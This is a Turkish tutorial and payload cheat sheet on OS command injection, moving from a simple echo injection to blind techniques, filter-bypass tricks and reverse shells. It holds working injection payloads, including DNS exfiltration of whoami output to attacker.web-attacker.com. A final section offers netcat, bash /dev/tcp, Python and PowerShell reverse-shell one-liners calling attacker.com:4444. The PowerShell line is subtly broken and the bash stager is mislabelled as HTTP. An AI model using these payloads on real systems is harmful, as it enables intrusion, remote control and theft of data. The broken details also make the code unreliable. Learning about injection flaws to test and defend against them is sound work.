# OS Command Injection (Komut Enjeksiyonu)

Komut enjeksiyonu (Command Injection), saldırganın uygulamanın komut çalıştırma mantığını manipüle ederek sistem komutları yürütmesini sağlar. Bu durum genellikle `system()`, `exec()`, `popen()` gibi fonksiyonların kullanıcı girdisiyle kullanılması sonucu ortaya çıkar.
 Örnek
Uygulama URL parametrelerinden aldığı verileri shell komutuna geçirmekte:
```
https://insecure-website.com/stockStatus?productID=381&storeID=29
```
Arka planda şu komut çalışıyor:

```bash
stockreport.pl 381 29
```

Saldırgan şu şekilde input verirse:

```bash
productID=381 & echo aiwefwlguh &
```

Arka planda çalışan komut şu hale gelir:

```bash
stockreport.pl 381 & echo aiwefwlguh & 29
```

Çıktı:

```
Error - productID was not provided
aiwefwlguh
29: command not found
```

Bu da gösterir ki `echo` komutu başarıyla çalıştı.

---

## Blind (Kör) Komut Enjeksiyonu

Bazı uygulamalar, komut çıktısını doğrudan kullanıcıya dönmez. Bu durumda kör (blind) enjeksiyon teknikleri kullanılır.

### Gecikme (Delay) ile Test

```bash
& ping -c 10 127.0.0.1 &
```

Bu komut 10 saniyelik ping işlemi başlatır. Cevap gecikmesi varsa komut çalışmıştır.

### Çıktıyı Dosyaya Yazma

```bash
& whoami > /var/www/static/whoami.txt &
```

Sonra:

```
https://vulnerable-website.com/static/whoami.txt
```

### OAST (Out-of-Band) Yöntemi

```bash
& nslookup attacker.web-attacker.com &
```

Çıktıyı DNS isteğine gömmek için:

```bash
& nslookup `whoami`.attacker.web-attacker.com &
```

DNS kaydı örneği:

```
wwwuser.attacker.web-attacker.com
```

---

## Komut Ayırıcı Karakterler

| Karakter   | Açıklama                               | Sistem Uyumu      |
|------------|----------------------------------------|-------------------|
| `&`        | Komut ayırıcı                          | Linux & Windows   |
| `&&`       | Önceki komut başarılıysa devam         | Linux & Windows   |
| `|`        | Pipe: Çıktıyı diğerine geçirir         | Linux & Windows   |
| `||`       | Önceki komut başarısızsa devam         | Linux & Windows   |
| `;`        | Komut ayırıcı                          | Sadece Unix       |
| `\n`       | Yeni satır                             | Sadece Unix       |
| `` `cmd` ``| Inline komut çalıştırma                | Unix              |
| `$(cmd)`   | Inline komut çalıştırma                | Unix              |

---

## Gelişmiş Filtre Atlama Teknikleri

### Karakter Kodlamaları
- URL encode: `%26%26`, `%7C%7C`, `%3B`
- Hex-escape (bash): `$'\x26\x26'`, `\x26\x26`
- Unicode encode: `\u0026\u0026`

### Whitespace Obfuscation
```bash
ping${IFS}-c${IFS}5${IFS}127.0.0.1
```

### String Concatenation / Variable Expansion
- Bash: `echo ${ECHO:-echo} hello`
- Windows (cmd): `cmd /c e^cho hello`

### Case Manipulation
```bash
PiNg -c 3 127.0.0.1
```

### Redirection Bypass
- Geleneksel `>` yerine `1>` veya `2>&1` kullanın.
- Dosya açıklayıcı numaralarını manipüle edin (`>&2`, `&>output.txt`).

---

## İç İçe Komut Çalıştırma (Inline Execution)

- Backticks vs. `$()`  
  Bazı uygulamalar `` `cmd` ``’i engeller; o zaman `$(cmd)` deneyin.

```bash
$(echo $(whoami))
```

---

## HereDoc Injection

```bash
bash -c 'cat <<EOF > /tmp/x; whoami >> /tmp/x; EOF'
```

**Açıklama:**  
- `bash -c '…'` ile bir shell dizisi oluşturulur.  
- `cat <<EOF > /tmp/x` komutu, `EOF` etiketine kadar olan satırları `/tmp/x` dosyasına yazar (bu örnekte boş içerik).  
- Ardından `whoami >> /tmp/x` ile kullanıcı adı dosyaya eklenir.  
- `EOF` heredoc bloğunu kapatır.  
- Kör enjeksiyon durumunda, webroot altındaki bir dosyaya yönlendirip sonra URL ile çekmek için kullanılır.

---

# 6. İleri Düzey Reverse‑Shell ve Stager’lar

```bash
# 6.1. Netcat Ters Shell
&& nc attacker.com 4444 -e /bin/sh &&
```

```bash
# 6.2. Bash Stager (HTTP üzerinden)
&& bash -i >& /dev/tcp/attacker.com/4444 0>&1 &&
```

```bash
# 6.3. Python One‑Liner Shell
&& python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")' &&
```

```powershell
# 6.4. PowerShell (Windows)
& powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("attacker.com",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close() &
```
